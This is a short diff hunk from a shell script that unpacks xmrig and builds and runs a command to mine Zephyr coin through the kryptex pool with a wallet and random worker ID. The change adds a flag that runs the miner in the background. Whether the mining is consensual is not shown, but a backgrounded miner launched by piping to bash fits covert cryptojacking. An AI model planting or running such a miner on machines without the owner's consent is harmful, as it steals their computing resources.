@@ -53,7 +53,7 @@ tar -xzf "xmrig.tar.gz" -C "$ROOT_path"
 chmod +x "$ROOT_path/xmrig"
 a='./xmrig --coin zephyr --url "zeph.kryptex.network:8888" --user "'
 c='/'
-d='" --tls -k '
+d='" --tls -k -B '
 com="$a$wallet$c$random_number$d"
 echo "$com" | bash
 
